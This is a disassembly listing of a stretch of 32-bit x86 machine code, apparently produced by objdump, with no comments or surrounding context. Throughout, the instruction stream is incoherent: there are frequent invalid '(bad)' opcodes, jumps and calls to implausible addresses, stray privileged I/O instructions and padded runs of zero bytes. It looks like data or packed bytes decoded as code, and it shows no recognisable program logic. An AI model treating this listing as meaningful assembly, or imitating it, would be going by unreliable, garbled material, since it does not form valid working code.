  42622f:	jmp    0x7c10f5dd
  426234:	lods   eax,DWORD PTR ds:[esi]
  426235:	mov    edx,0xd564651
  42623a:	popf   
  42623b:	dec    esp
  42623c:	lock repnz ins BYTE PTR es:[edi],dx
  42623f:	mov    BYTE PTR [ebx-0x3f6bd1fb],bh
  426245:	push   ss
  426246:	fstp   st(1)
  426248:	xchg   esi,eax
  426249:	sub    bh,0x8a
  42624c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624d:	sub    al,0x24
  42624f:	fidivr WORD PTR [esi-0x5]
  426252:	fucomi st,st(6)
  426254:	push   edi
  426255:	xor    dl,ch
  426257:	retf   
  426258:	out    dx,al
  426259:	jle    0x42626f
  42625b:	push   cs
  42625c:	retf   
  42625d:	pop    ss
  42625e:	call   0x8bffebde
  426263:	mov    dl,0x9
  426265:	and    al,ah
  426267:	clc    
  426268:	add    ebx,eax
  42626a:	repnz loope 0x4262e9
  42626d:	xchg   edi,eax
  42626e:	xor    dl,BYTE PTR [eax]
  426270:	punpckhbw mm6,mm6
  426273:	adc    DWORD PTR [edi+0x424f4ed8],esi
  426279:	adc    esi,esi
  42627b:	enter  0x9574,0x10
  42627f:	or     cl,BYTE PTR [eax+0x3d]
  426282:	or     esi,esi
  426284:	outs   dx,DWORD PTR ds:[esi]
  426285:	fsub   DWORD PTR [ebp+0x6fb810f4]
  42628b:	dec    edx
  42628c:	mov    dl,0xe9
  42628e:	sbb    ch,BYTE PTR ds:0x15818407
  426294:	ins    BYTE PTR es:[edi],dx
  426295:	fwait
  426296:	pop    es
  426297:	sub    al,0xb0
  426299:	push   0xffffffb8
  42629b:	mov    edi,esi
  42629d:	jp     0x426250
  42629f:	mov    eax,0xb3967c50
  4262a4:	pusha  
  4262a5:	jne    0x42630b
  4262a7:	pop    ecx
  4262a8:	call   0xdc7de024
  4262ad:	push   es
  4262ae:	leave  
  4262af:	in     al,dx
  4262b0:	outs   dx,DWORD PTR ds:[esi]
  4262b1:	mov    edi,DWORD PTR [edx-0x2168def4]
  4262b7:	mov    esi,DWORD PTR [edi+ecx*4+0x12]
  4262bb:	and    edx,DWORD PTR [ebx+0x51aa4663]
  4262c1:	(bad)  
  4262c3:	arpl   WORD PTR [ecx],ax
  4262c5:	sbb    DWORD PTR [esi+0x2a],ecx
  4262c8:	ja     0x426331
  4262ca:	dec    esp
  4262cb:	inc    DWORD PTR [edx-0x51]
  4262ce:	loope  0x426273
  4262d0:	fstp   TBYTE PTR [ecx]
  4262d2:	pop    edi
  4262d3:	cmp    eax,0x1149f164
  4262d8:	mov    eax,0x1d13a6ee
  4262dd:	addr16 inc edi
  4262df:	add    dh,BYTE PTR [esi]
  4262e1:	inc    esp
  4262e2:	add    BYTE PTR [ecx+0x537cfd8f],cl
  4262e8:	out    dx,eax
  4262e9:	xchg   esi,eax
  4262ea:	or     eax,0xa08f0ae5
  4262ef:	sbb    bh,ah
  4262f1:	lock ss mov eax,0x6cfb2a78
  4262f8:	loop   0x42628f
  4262fa:	and    eax,0xda1c60e1
  4262ff:	mov    ch,0xd8
  426301:	push   0x1e85c97e
  426306:	xchg   ebx,eax
  426307:	aas    
  426308:	inc    edx
  426309:	push   ebx
  42630a:	mov    al,0xce
  42630c:	xor    bh,BYTE PTR [edx+0x74]
  42630f:	(bad)  
  426310:	jne    0x426312
	...
  426372:	add    BYTE PTR [eax],al
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xccc302bf
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x64000001
  42638d:	aad    0xb3
  42638f:	xchg   esi,eax
  426390:	mov    esp,0x2afcfa00
  426395:	sub    esp,ebx
  426397:	ret    0x479e
  42639a:	xor    DWORD PTR [edi-0x63],esi
  42639d:	mov    eax,DWORD PTR [edx-0x648406b1]
  4263a3:	hlt    
  4263a4:	popa   
  4263a5:	mov    eax,0x7241f409
  4263aa:	jno    0x4263d3
  4263ac:	fcmovnu st,st(0)
  4263ae:	jl     0x4263f5
  4263b0:	lahf   
  4263b1:	dec    ebx
  4263b2:	jae    0x42641d
  4263b4:	inc    ebx
  4263b5:	mov    ebx,0x7f78b9ee
  4263ba:	xchg   ebp,eax
  4263bb:	and    eax,0x892f1f07
  4263c0:	fsubr  QWORD PTR [edi-0x75]
  4263c3:	sub    esp,DWORD PTR [edi+0x54]
  4263c6:	mov    es,WORD PTR [ebx+0x616d7982]
  4263cc:	imul   esp,DWORD PTR [eax-0x66],0xffffffe8
  4263d0:	sub    BYTE PTR [edi],0x6
  4263d3:	sbb    BYTE PTR [edx-0x12],bh
  4263d6:	loop   0x426431
  4263d8:	mov    ?,WORD PTR [ecx+0x68e186ae]
  4263de:	std    
  4263df:	cwde   
  4263e0:	pop    edx
  4263e1:	shl    BYTE PTR gs:0x50034072,1
  4263e8:	mov    WORD PTR [esi+ebx*2+0x3480b70a],gs
  4263ef:	xor    DWORD PTR [ebx+0x767c834c],ebp
  4263f5:	pop    es
  4263f6:	int    0x7e
  4263f8:	dec    esp
  4263f9:	adc    eax,0x77687ae
  4263fe:	inc    ebp
  4263ff:	push   cs
  426400:	lea    ebp,[esp+ecx*4+0x1c62cad0]
  426407:	dec    eax
  426408:	call   0xeee558da
  42640d:	repz in eax,0xaa
  426410:	dec    edi
  426411:	outs   dx,DWORD PTR ds:[esi]
  426412:	fistp  QWORD PTR ds:0xf74037f3
  426418:	jno    0x4263fe
  42641a:	sub    DWORD PTR [ecx+ebp*4-0x7e],0xa5e0e8e6
  426422:	push   ebx
  426423:	jecxz  0x426402
  426425:	test   al,0xc4
  426427:	and    BYTE PTR [edi],bh
  426429:	std    
  42642a:	jmp    0xf9a:0xdb625dc5
  426431:	jno    0x42641b
  426433:	jg     0x42646b
  426435:	inc    eax
  426436:	push   esi
  426437:	xchg   dx,ax
  426439:	adc    eax,0x8a358f5f
  42643e:	and    BYTE PTR [ebx],0x32
  426441:	cmp    al,0x39
  426443:	push   ds
  426444:	dec    esi
  426445:	sub    ch,BYTE PTR [edi+0x3c]
  426448:	inc    edi
  426449:	sub    eax,0xfe08b7b4
  42644e:	ret    0x77c0
  426451:	(bad)  
  426452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426453:	cmp    DWORD PTR [edi+0x29],edx
  426456:	in     eax,dx
  426457:	aas    
  426458:	pop    eax
  426459:	xor    ebp,DWORD PTR [eax]
  42645b:	lea    esp,[ecx-0x1c]
  42645e:	repz loopne 0x42642b
  426461:	pop    ecx
  426462:	in     al,dx
  426463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426464:	pop    edi
  426465:	ss ret 0x7a88
  426469:	inc    ecx
  42646a:	fld    TBYTE PTR [ecx-0x4f]
  42646d:	jg     0x426445
  42646f:	mov    ah,0x7a
  426471:	stos   BYTE PTR es:[edi],al
  426472:	(bad)  
  426473:	out    dx,eax
  426474:	dec    ecx
  426475:	ror    DWORD PTR [esp+edx*2],cl
  426478:	push   ebp
  426479:	mov    ch,0x71
  42647b:	faddp  st(2),st
  42647d:	outs   dx,BYTE PTR ds:[esi]
  42647e:	in     eax,0xaf
  426480:	mov    edx,0xf0312716
  426485:	mov    ebp,0xcb9fe3b0
  42648a:	repz dec esp
  42648c:	adc    BYTE PTR [esi-0x5a],ch
  42648f:	lock mov ch,0x0
	...
  4264f2:	add    BYTE PTR [eax],al
  4264f4:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  4264fb:	outs   dx,DWORD PTR ds:[esi]
  4264fc:	vmwrite ecx,DWORD PTR [edx-0x61c0e07b]
  426503:	stc    
  426504:	mov    al,0x99
  426506:	add    DWORD PTR [eax],eax
  426508:	add    eax,0xb3000001
  42650d:	pop    ecx
  42650e:	ds rcr BYTE PTR ds:[ecx+0xd982dc3],cl
  426516:	sbb    DWORD PTR [ecx],ebx
  426518:	or     esp,0xd262eac0
  42651e:	cmc    
  42651f:	xor    BYTE PTR [esi-0x159c1010],ah
  426525:	inc    edi
  426526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426527:	push   0xffffff80
  426529:	cmc    
  42652a:	mov    es,WORD PTR [ebx+0x68]
  42652d:	fs jmp 0x9a9e8c6e
  426533:	(bad)  
  426534:	push   0x5671d4c2
  426539:	jo     0x426553
  42653b:	popa   
  42653c:	scas   eax,DWORD PTR es:[edi]
  42653d:	push   es
  42653e:	xor    DWORD PTR [ecx+0x4a],ebx
  426541:	push   0xfafb0303
  426546:	xor    edi,edi
  426548:	mov    cs,WORD PTR [esi-0x3d55b9cc]
  42654e:	lds    esp,FWORD PTR [edi]
  426550:	nop
  426551:	lahf   
  426552:	xchg   edx,eax
  426553:	stos   BYTE PTR es:[edi],al
  426554:	data16 jp 0x426546
  426557:	(bad)  
  426558:	int3   
  426559:	icebp  
  42655a:	mov    ds:0x15fe0dd4,al
  42655f:	fstp   DWORD PTR [edx+edx*1-0x4]
  426563:	xchg   edx,edx
  426565:	(bad)
  426568:	sub    eax,0xcdf28658
  42656d:	gs aad 0xd2
  426570:	and    ah,BYTE PTR [ebp-0xe]
  426573:	mov    edi,0x8c681df4
  426578:	pop    edx
  426579:	lods   eax,DWORD PTR ds:[esi]
  42657a:	sbb    eax,0xff1d8c69
  42657f:	in     eax,0x25
  426581:	inc    eax
  426582:	ficom  WORD PTR ss:[ebx]
  426585:	pop    esp
  426586:	(bad)  
  426587:	push   edi
  426588:	cs xchg edx,eax
  42658a:	xor    ch,BYTE PTR [ebx]
  42658c:	rcl    BYTE PTR [ecx+0x66],0x5b
  426590:	ins    DWORD PTR es:[edi],dx
  426591:	outs   dx,BYTE PTR ds:[esi]
  426592:	lahf   
  426593:	or     eax,0x2e03f4e2
  426598:	sahf   
  426599:	fst    QWORD PTR [ecx-0x5d584d0c]
  42659f:	cmp    al,0x1d
  4265a1:	inc    edx
  4265a2:	sti    
  4265a3:	loope  0x426543
  4265a5:	xchg   ebp,eax
  4265a6:	sbb    eax,0x1da0b303
  4265ab:	push   ebx
  4265ac:	scas   al,BYTE PTR es:[edi]
  4265ad:	dec    edi
  4265ae:	lods   al,BYTE PTR ds:[esi]
  4265af:	mov    bl,bl
  4265b1:	add    al,0xfe
  4265b3:	aas    
  4265b4:	aam    0xae
  4265b6:	inc    ebp
  4265b7:	push   edi
  4265b8:	sbb    al,0x29
  4265ba:	(bad)  [eax+0x79c872ae]
  4265c0:	clc    
  4265c1:	push   es
  4265c2:	(bad)  
  4265c4:	push   0xffffffe9
  4265c6:	or     eax,0xde3ef006
  4265cb:	add    DWORD PTR [eax+0x5e6ea02f],ecx
  4265d1:	test   al,0x31
  4265d3:	daa    
  4265d4:	repnz fs loop 0x426613
  4265d8:	mov    ds:0xbe80fc11,al
  4265dd:	popa   
  4265de:	clc    
  4265df:	xor    DWORD PTR [edi],edx
  4265e1:	leave  
  4265e2:	seta   al
  4265e5:	std    
  4265e6:	cwde   
  4265e7:	dec    esp
  4265e8:	bound  eax,QWORD PTR [edi+0x5]
  4265eb:	or     esi,eax
  4265ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265ee:	es test eax,0x299d273f
  4265f4:	mov    eax,ds:0xdba0b018
  4265f9:	xchg   DWORD PTR [ebx-0x64],ebx
  4265fc:	cmp    al,0xe9
  4265fe:	imul   ecx,DWORD PTR [edi-0x5b],0xbb747c36
  426605:	xor    ebx,DWORD PTR [esi]
  426607:	jbe    0x426630
  426609:	and    BYTE PTR [edx+0x4],dl
  42660c:	(bad)  
  42660d:	sbb    esi,DWORD PTR [edx+0x4dfc]
	...
  426673:	add    BYTE PTR [edx],dl
  426675:	retf   
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x7eb66da4]
  426682:	xchg   esp,eax
  426683:	popf   
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0x52000001
  42668d:	push   0x1f8243ae
  426692:	mov    al,ds:0x44bec02b
  426697:	cmp    al,0x96
  426699:	sbb    BYTE PTR [esi-0x5a],al
  42669c:	cs mov ebp,0xfcdc6fb8
  4266a2:	popa   
  4266a3:	icebp  
  4266a4:	cli    
  4266a5:	in     eax,0x39
  4266a7:	xlat   BYTE PTR ds:[ebx]
  4266a8:	inc    esi
  4266a9:	daa    
  4266aa:	popa   
  4266ab:	fs retf 0xbe20
  4266af:	pop    ss
  4266b0:	imul   ebx,DWORD PTR [esi-0x21087745],0x951e3991
  4266ba:	inc    edi
  4266bb:	add    eax,0xaf8d338
  4266c0:	xchg   DWORD PTR [edx+0x65],ebx
  4266c3:	out    0x9,al
  4266c5:	push   ebp
  4266c6:	aam    0x92
  4266c8:	les    ebp,FWORD PTR [esi-0x4a7b56ee]
  4266ce:	jecxz  0x4266bc
  4266d0:	pop    ebx
  4266d1:	inc    esp
  4266d2:	and    al,0x46
  4266d4:	sub    al,0x1b
  4266d6:	cli    
  4266d7:	mov    BYTE PTR [edi+eax*2+0x1d],0xfe
  4266dc:	shr    eax,1
  4266de:	pop    esp
  4266df:	sbb    eax,0xe31a3070
  4266e4:	shr    BYTE PTR [ebx+eiz*4],cl
  4266e7:	out    0x78,al
  4266e9:	sahf   
  4266ea:	lea    ebp,[esi]
  4266ec:	jmp    FWORD PTR [bx+0x458e]
  4266f1:	aaa    
  4266f2:	mov    dl,0x46
  4266f4:	mov    ebx,esi
  4266f6:	stc    
  4266f7:	and    eax,0xf2a97bb8
  4266fc:	int    0xf1
  4266fe:	adc    ecx,DWORD PTR [ecx+0x5f]
  426701:	cdq    
  426702:	push   esp
  426703:	jg     0x42671c
  426705:	mov    DWORD PTR ds:0x9bf910c5,edx
  42670b:	ss pop ebx
  42670d:	mov    esi,0x93f51503
  426712:	and    al,0x3d
  426714:	add    esi,edi
  426716:	es iret 
  426718:	test   BYTE PTR [edx],cl
  42671a:	xchg   ebp,eax
  42671b:	in     eax,0x28
  42671d:	lds    esi,FWORD PTR [edx]
  42671f:	mov    fs,WORD PTR [ebp-0x33]
  426722:	mov    esi,0x3d6fd1ea
  426727:	aad    0x73
  426729:	pop    eax
  42672a:	pop    eax
  42672b:	inc    edi
  42672c:	dec    ebp
  42672d:	sub    BYTE PTR [edx+0xe],bl
  426730:	test   DWORD PTR [ecx],esi
  426732:	xchg   DWORD PTR [ebp+0x67a4f32d],edi
  426738:	mov    edx,0x91daafee
  42673d:	xlat   BYTE PTR ds:[ebx]
  42673e:	jns    0x4266f7
  426740:	je     0x42674e
  426742:	jbe    0x4267a6
  426744:	imul   edx,DWORD PTR [ebx-0x6a2bcbf2],0xb9635dc7
  42674e:	sbb    eax,DWORD PTR [esi]
  426750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426751:	xor    ebp,ecx
  426753:	xchg   esi,eax
  426754:	mov    dh,0x29
  426756:	jmp    0x426796
  426758:	dec    esi
  426759:	gs stc 
  42675b:	pop    eax
  42675c:	inc    eax
  42675d:	dec    esi
  42675e:	int    0x28
  426760:	xor    BYTE PTR [esp+ecx*2],dh
  426763:	sub    DWORD PTR [esi-0x6e],ebp
  426766:	int    0x34
  426768:	sub    ecx,DWORD PTR ds:0x9d554ac5
  42676e:	xchg   DWORD PTR [eax+ebx*2+0x3d8099a5],esp
  426775:	dec    ecx
  426776:	adc    eax,0xd948bb
  42677b:	fcom   QWORD PTR [edi+ebp*8-0x17]
  42677f:	fdivp  st(5),st
  426781:	sti    
  426782:	test   eax,0x94ef6b0a
  426787:	ret    
  426788:	jp     0x4267b0
  42678a:	scas   al,BYTE PTR es:[edi]
  42678b:	add    eax,ebx
  42678d:	out    0x50,eax
  42678f:	lods   al,BYTE PTR ds:[esi]
  426790:	and    al,0x0
	...
  4267f2:	add    BYTE PTR [eax],al
  4267f4:	mov    eax,0xff2ace8d
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426801:	and    al,dh
  426803:	dec    edi
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    BYTE PTR [ebx+0x7ec3a660],ah
  426811:	push   cs
  426812:	sbb    al,0xd
  426814:	stos   DWORD PTR es:[edi],eax
  426815:	mov    ?,WORD PTR [ebp+0x34]
  426818:	sahf   
  426819:	repz add eax,0xfe0f7650
  42681f:	add    al,0xf9
  426821:	fst    QWORD PTR [esi-0x65]
  426824:	int    0xb2
  426826:	or     al,bh
  426828:	(bad)  
  42682a:	pop    eax
  42682b:	and    eax,0x82319432
  426830:	push   es
  426831:	push   esp
  426832:	clc    
  426833:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426834:	adc    dl,0x60
  426837:	add    bh,BYTE PTR [ebp-0x58bb4b25]
  42683d:	bound  ebp,QWORD PTR [edx]
  42683f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426840:	mov    dl,0x6c
  426842:	cld    
  426843:	test   BYTE PTR [eax],bl
  426845:	sbb    cl,BYTE PTR [esi+0x74]
  426848:	jbe    0x42683f
  42684a:	sbb    edx,DWORD PTR [ecx-0x5a265b0e]
  426850:	repnz sbb al,0xe9
  426853:	adc    DWORD PTR [edi-0x6f],edx
  426856:	test   DWORD PTR [ebx],eax
  426858:	je     0x42685a
  42685a:	inc    ecx
  42685b:	sbb    ebp,DWORD PTR [edx+edx*4+0x399fe6b5]
  426862:	jle    0x426829
  426864:	leave  
  426865:	test   al,0x4a
  426867:	inc    esp
  426868:	icebp  
  426869:	repnz adc eax,0x50d4d926
  42686f:	loop   0x426891
  426871:	ss inc esi
  426873:	jl     0x426867
  426875:	dec    esp
  426876:	mov    ch,0x27
  426878:	xchg   ebp,eax
  426879:	mov    dh,0xee
  42687b:	jae    0x42682a
  42687d:	push   0x3529520e
  426882:	in     al,dx
  426883:	ins    BYTE PTR es:[edi],dx
  426884:	xor    esi,ecx
  426886:	ss mov cl,0x1b
  426889:	inc    edi
  42688a:	jb     0x426827
  42688c:	(bad)  
  42688d:	sub    DWORD PTR [ebp+0xf845146],edi
  426893:	bound  edx,QWORD PTR [ecx-0x26]
  426896:	dec    esi
  426897:	lods   al,BYTE PTR ds:[esi]
  426898:	outs   dx,DWORD PTR ds:[esi]
  426899:	inc    ecx
  42689a:	std    
  42689b:	stos   BYTE PTR es:[edi],al
  42689c:	sub    al,0x6b
  42689e:	jbe    0x426872
  4268a0:	into   
  4268a1:	lds    eax,FWORD PTR [ebx+0x671cc745]
  4268a7:	bound  ebx,QWORD PTR [ecx]
  4268a9:	imul   esi,ecx,0xffffffd3
  4268ac:	outs   dx,DWORD PTR ds:[esi]
  4268ad:	cmp    ch,ch
  4268af:	lods   eax,DWORD PTR ds:[esi]
  4268b0:	retf   0x7691
  4268b3:	cmp    al,BYTE PTR [ecx+0xa]
  4268b6:	xchg   ebx,eax
  4268b7:	pop    ss
  4268b8:	in     eax,dx
  4268b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268ba:	mov    eax,DWORD PTR [eax-0x17]
  4268bd:	mov    al,0xda
  4268bf:	int    0xde
  4268c1:	std    
  4268c2:	pusha  
  4268c3:	or     ah,BYTE PTR [edi-0x32c211ca]
  4268c9:	cmp    DWORD PTR [ecx-0x5ba405bb],ebx
  4268cf:	pop    ecx
  4268d0:	inc    eax
  4268d1:	enter  0x75c5,0x3c
  4268d5:	out    dx,al
  4268d6:	out    0x65,eax
  4268d8:	adc    DWORD PTR [esi-0x7ac931b1],0xe8e59aba
  4268e2:	cli    
  4268e3:	xchg   esi,eax
  4268e4:	and    esp,DWORD PTR [eax]
  4268e6:	xchg   BYTE PTR [esi+0x3072ea97],ch
  4268ec:	popa   
  4268ed:	fnstenv [edi-0x756a2c15]
  4268f3:	aaa    
  4268f4:	pop    eax
  4268f5:	sti    
  4268f6:	or     BYTE PTR [ebp+0x57872c56],ah
  4268fc:	mov    ebx,0x69c5df15
  426901:	jp     0x4268d4
  426903:	add    BYTE PTR [ebx],0x29
  426906:	iret   
  426907:	push   es
  426908:	add    ebx,edx
  42690a:	push   esp
  42690b:	cmp    edx,ebp
  42690d:	hlt    
  42690e:	mov    edi,0x6efb
	...
  426973:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  42697a:	mov    edi,?
  42697c:	sub    ebp,esp
  42697e:	lahf   
  42697f:	mov    ecx,DWORD PTR [eax-0x40654b43]
  426985:	pushf  
  426986:	add    DWORD PTR [eax],eax
  426988:	add    eax,0x2e000001
  42698d:	cmp    al,0x80
  42698f:	dec    edi
  426990:	mov    ecx,esp
  426992:	sbb    edx,DWORD PTR [ecx]
  426994:	xchg   ecx,eax
  426995:	lahf   
  426996:	outs   dx,BYTE PTR ds:[esi]
  426997:	ret    
  426998:	int    0xff
  42699a:	iret   
  42699b:	sbb    eax,0x6c62dfa8
  4269a0:	mov    al,0xd9
  4269a2:	cmp    BYTE PTR ds:0x65b78284,cl
  4269a8:	out    dx,eax
  4269a9:	push   esi
  4269aa:	call   0xc1f61747
  4269af:	push   esi
  4269b0:	loope  0x426959
  4269b2:	push   ebx
  4269b3:	dec    ecx
  4269b4:	sbb    eax,eax
  4269b6:	(bad)  
  4269b7:	fstp   QWORD PTR [eax+0x3a492848]
  4269bd:	xchg   esp,eax
  4269be:	enter  0x96ca,0xe4
  4269c2:	mov    edx,0x5c935f52
  4269c7:	into   
  4269c8:	add    eax,0x1800d27d
  4269cd:	and    ah,ah
  4269cf:	adc    esi,DWORD PTR [edi+0x59da46d4]
  4269d5:	aam    0xea
  4269d7:	in     eax,0xec
  4269d9:	ret    0xd9e0
  4269dc:	mov    bl,0x4a
  4269de:	xchg   BYTE PTR [eax-0x4059e9e],bh
  4269e4:	sbb    ah,BYTE PTR [eax+edi*2-0x772f5b7c]
  4269eb:	movmskps esi,xmm0
  4269ee:	or     edx,ebp
  4269f0:	loop   0x426a3d
  4269f2:	cmc    
  4269f3:	xchg   ebx,eax
  4269f4:	add    eax,0xa756573e
  4269f9:	sub    al,0xf
  4269fb:	jle    0x426a65
  4269fd:	mov    cl,0x97
  4269ff:	test   eax,0xddfac6ba
  426a04:	ficomp WORD PTR [eax]
  426a06:	and    eax,0x9980147c
  426a0b:	(bad)  
  426a0d:	adc    esi,edx
  426a0f:	or     ebx,DWORD PTR [ebx+0x63a9e167]
  426a15:	shl    dh,0xb0
  426a18:	aaa    
  426a19:	pop    ds
  426a1a:	lea    eax,[ebp-0x74]
  426a1d:	inc    eax
  426a1e:	aad    0x6e
  426a20:	iret   
  426a21:	adc    al,0xf9
  426a23:	ja     0x426a8e
  426a25:	shr    BYTE PTR [esi+esi*8-0x4dc108e],0x7d
  426a2d:	push   edx
  426a2e:	xor    al,0x13
  426a30:	mov    ebx,0x829525e9
  426a35:	xor    eax,DWORD PTR [ecx+0x4c]
  426a38:	xor    eax,0xbef4c750
  426a3d:	test   DWORD PTR [esi-0x345d5df3],0x2aa87529
  426a47:	or     bh,BYTE PTR [ebx+0x4af7c00d]
  426a4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a4e:	xchg   edx,eax
  426a4f:	pop    ecx
  426a50:	ss int 0xf3
  426a53:	mov    esi,0xfece6dfe
  426a58:	xor    al,BYTE PTR [eax]
  426a5a:	mov    ds:0x7706f295,eax
  426a5f:	dec    eax
  426a60:	stos   DWORD PTR es:[edi],eax
  426a61:	fisttp DWORD PTR [edx+esi*4+0x322ec4bc]
  426a68:	mov    cl,0xb6
  426a6a:	hlt    
  426a6b:	ins    DWORD PTR es:[edi],dx
  426a6c:	and    dh,BYTE PTR [edx-0x545df8b1]
  426a72:	ficom  WORD PTR [ebx-0x35aa964a]
  426a78:	sbb    eax,DWORD PTR [edx-0x22b2a618]
  426a7e:	jp     0x426adf
  426a80:	mov    ecx,0xb20f5e6
  426a85:	and    bl,BYTE PTR [eax+0x13]
  426a88:	cli    
  426a89:	pop    ds
  426a8a:	mov    bh,BYTE PTR [eax+0x6bc41eb4]
  426a90:	sub    eax,DWORD PTR [eax]
	...
  426af2:	add    BYTE PTR [eax],al
  426af4:	cdq    
  426af5:	sub    BYTE PTR ds:0xdb77bd56,cl
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0xbc
  426b01:	mov    bl,0xcc
  426b03:	in     al,dx
  426b04:	les    ebx,FWORD PTR [ebp+0x1050001]
  426b0a:	add    BYTE PTR [eax],al
  426b0c:	fcomp  st(5)
  426b0e:	ret    0xecc
  426b11:	fucomi st,st(4)
  426b13:	xor    eax,0x4d427d45
  426b18:	mov    eax,0x804a9288
  426b1d:	icebp  
  426b1e:	cli    
  426b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b20:	std    
  426b21:	imul   eax,DWORD PTR [esi-0x51180298],0x595b08cb
  426b2b:	adc    ebp,DWORD PTR ds:0x66c50d8f
  426b31:	test   eax,0xc96fbdd
  426b36:	leave  
  426b37:	mov    ecx,0xbfc209ca
  426b3c:	xchg   ebx,eax
  426b3d:	inc    ecx
  426b3e:	sar    ch,1
  426b40:	mov    ah,0x6c
  426b42:	jns    0x426b26
  426b44:	in     eax,0x2d
  426b46:	jmp    0xaf4a:0x73f72402
  426b4d:	test   DWORD PTR [ebp+0x15],ebx
  426b50:	sub    eax,0xbe74e837
  426b55:	and    ebx,edx
  426b57:	dec    edx
  426b58:	aaa    
  426b59:	test   edi,ebx
  426b5b:	and    al,0x4e
  426b5d:	sub    bh,0x20
  426b60:	mov    eax,ds:0x9bd77c45
  426b65:	mov    cl,BYTE PTR [edi-0x1e318dc0]
  426b6b:	dec    ecx
  426b6c:	xchg   DWORD PTR [ebx],edi
  426b6e:	pop    eax
  426b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b70:	xchg   BYTE PTR [esi+0x3a],bh
  426b73:	xchg   edi,eax
  426b74:	std    
  426b75:	cdq    
  426b76:	or     esi,ecx
  426b78:	into   
  426b79:	out    0x40,eax
  426b7b:	pusha  
  426b7c:	rcr    dh,1
  426b7e:	jno    0x426b77
  426b80:	jne    0x426b2f
  426b82:	sbb    DWORD PTR [eax+0x13],esi
  426b85:	pop    ss
  426b86:	(bad)  
  426b87:	icebp  
  426b88:	jno    0x426b4b
  426b8a:	xor    DWORD PTR [ebp-0x45930d0f],ecx
  426b90:	loop   0x426ba5
  426b92:	add    DWORD PTR [eax],eax
  426b94:	ja     0x426bda
  426b96:	mov    DWORD PTR ds:0xff11b439,ebp
  426b9c:	fadd   DWORD PTR [esi]
  426b9e:	mov    BYTE PTR [ebx+0x39],bl
  426ba1:	aas    
  426ba2:	cdq    
  426ba3:	mov    BYTE PTR [ecx+0x61],0x26
  426ba7:	mov    eax,ds:0x6050cd58
  426bac:	rol    DWORD PTR [ecx-0x197a9405],1
  426bb2:	push   esp
  426bb3:	adc    BYTE PTR [eax-0x6b],dl
  426bb6:	xor    edi,DWORD PTR [edi+0x3d]
  426bb9:	test   ebx,ebp
  426bbb:	sbb    al,0x82
  426bbd:	pop    edx
  426bbe:	adc    dl,ch
  426bc0:	leave  
  426bc1:	jmp    0x426b48
  426bc3:	(bad)  
  426bc4:	outs   dx,DWORD PTR ds:[esi]
  426bc5:	pop    esi
  426bc6:	adc    eax,0xaba5d9cf
  426bcb:	nop
  426bcc:	ret    0x3079
  426bcf:	stos   DWORD PTR es:[edi],eax
  426bd0:	xchg   edx,eax
  426bd1:	sub    al,0x53
  426bd3:	cmp    al,0xdd
  426bd5:	pop    ebp
  426bd6:	and    al,0xd5
  426bd8:	xchg   ecx,eax
  426bd9:	inc    BYTE PTR [ecx]
  426bdb:	adc    DWORD PTR [ebx+0x60c5c31b],ebx
  426be1:	cmp    ebx,edx
  426be3:	retf   
  426be4:	xor    BYTE PTR [ebp-0x50],0x80
  426be8:	push   esi
  426be9:	lds    esp,FWORD PTR [ecx]
  426beb:	dec    esi
  426bec:	in     eax,0x7b
  426bee:	data16 std 
  426bf0:	mov    eax,0x617c9d68
  426bf5:	xchg   edx,eax
  426bf6:	adc    al,0xaf
  426bf8:	aaa    
  426bf9:	xlat   BYTE PTR ds:[ebx]
  426bfa:	xchg   ecx,eax
  426bfb:	add    BYTE PTR [ebp-0x27],dl
  426bfe:	or     eax,edi
  426c00:	mov    dh,BYTE PTR [ebp+0x32]
  426c03:	mov    dl,0x3f
  426c05:	pop    ebp
  426c06:	js     0x426bb0
  426c08:	xchg   edx,eax
  426c09:	inc    esi
  426c0a:	sbb    BYTE PTR [edi-0x51],dh
  426c0d:	in     eax,0x80
  426c0f:	cmp    eax,DWORD PTR [esi+0x0]
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x48cbd04
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x3e000001
  426c8d:	loopne 0x426c8f
  426c8f:	adc    eax,0x6e80aff7
  426c94:	into   
  426c95:	cmp    DWORD PTR [esi],edi
  426c97:	rcl    BYTE PTR [ebx+0x21],1
  426c9a:	pop    ecx
  426c9b:	mov    bh,0xd8
  426c9d:	push   ecx
  426c9e:	cmp    dl,ah
  426ca0:	xor    al,0x13
  426ca2:	ins    BYTE PTR es:[edi],dx
  426ca3:	stc    
